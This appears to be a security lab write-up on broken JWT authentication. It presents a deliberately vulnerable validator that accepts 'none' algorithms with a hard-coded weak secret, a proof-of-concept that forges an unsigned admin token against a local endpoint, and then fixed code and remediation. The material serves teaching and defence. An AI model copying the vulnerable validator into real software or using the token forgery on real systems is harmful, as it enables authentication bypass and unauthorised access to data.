# Broken Authentication

| Field | Value |
|-------|-------|
| OWASP Category | API2:2023 - Broken Authentication |
| Endpoint | `GET /api/v1/secure-data` |
| Severity | **Critical** (CVSS ~9.1) |

## Description

The vulnerable token validator accepts the `none` algorithm, does not verify
the signature, and ignores the `exp` claim. An attacker can forge an unsigned
JWT claiming `role=admin` and access protected data. The signing secret is
also hard-coded and weak (`secret123`).

## Vulnerable Code Snippet

```python
# vulnerable_version/auth.py
SECRET_KEY = "secret123"

def decode_token(token: str) -> dict:
    return jwt.decode(
        token, SECRET_KEY,
        algorithms=["HS256", "none"],        # accepts unsigned tokens
        options={"verify_signature": False,  # signature not enforced
                 "verify_exp": False},        # expiry not checked
    )
```

## Steps to Reproduce

```bash
uvicorn vulnerable_version.main:app --port 8000
```

Forge an `alg:none` token and call the endpoint:

```python
import jwt, requests
forged = jwt.encode({"sub": "1", "role": "admin"}, key="", algorithm="none")
r = requests.get("http://127.0.0.1:8000/api/v1/secure-data",
                 headers={"Authorization": f"Bearer {forged}"})
print(r.status_code, r.json())   # 200, admin data
```

Automated: `python exploits/exploit_auth.py`

## Impact

- Complete authentication bypass and privilege escalation to admin.
- Tokens never expire, so a single leak is valid forever.

## Fixed Code Snippet

```python
# fixed_version/auth.py
SECRET_KEY = os.environ.get("API_LAB_SECRET", "<strong-random-fallback>")

def decode_token(token: str) -> dict:
    return jwt.decode(
        token, SECRET_KEY,
        algorithms=["HS256"],                # "none" refused
        options={"verify_signature": True,
                 "verify_exp": True,
                 "require": ["exp", "iat", "sub"]},
    )
```

## Remediation

- Pin an explicit allow-list of algorithms; never allow `none`.
- Always verify the signature and the `exp` claim.
- Load a strong secret from configuration / a secrets manager, not source.
- Rotate secrets and set short token lifetimes (here: 15 minutes).
